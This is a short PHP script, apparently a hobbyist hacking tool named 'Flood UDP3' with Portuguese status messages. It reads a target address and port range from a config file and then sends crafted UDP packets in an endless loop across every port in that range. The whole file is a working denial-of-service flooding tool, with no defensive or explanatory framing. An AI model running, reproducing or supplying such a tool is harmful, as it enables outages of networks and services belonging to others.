<?php 
echo "#-#-#-#-#-#-#-#-#-#-#-#-#\n";
echo "#-#- Flood UDP3   #-#-#-#\n";
echo "#-#- By Uchihaker #-#-#-#\n";
echo "#-#-#-#-#-#-#-#-#-#-#-#-#\n";
sleep(3);
require "config/settings.ini";
echo "Config carregada!\n";
echo "Alvo...... ".$addr."\n";
sleep(2);
$uleep = $interval < 0 ? 0 : $interval*1000;

function pk($int,$len){return (pack($len,$int));}
$a= pk(11,'v');
$a.= pk(11,'V');
$b= pk(1,'v');
$b.= pk(1,'V');
$b.= pk(1,'V');

$sk = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);

while(true){
	for ($p = $startPort;$p <= $endPort;$p++) { 
		for ($packet=0; $packet < $packetPerPort; $packet++) { 
			socket_sendto($sk,  $a,strlen($a), 0, $addr, $p);
			socket_sendto($sk,  $b,strlen($b), 0, $addr, $p);
		}
		
		if ($verbose) {
			echo "$packet pacotes enviados na porta $p!\n";
		}
		usleep($uleep);
	}
	echo "Restart flood...\n";
	sleep(10);
	
}
?>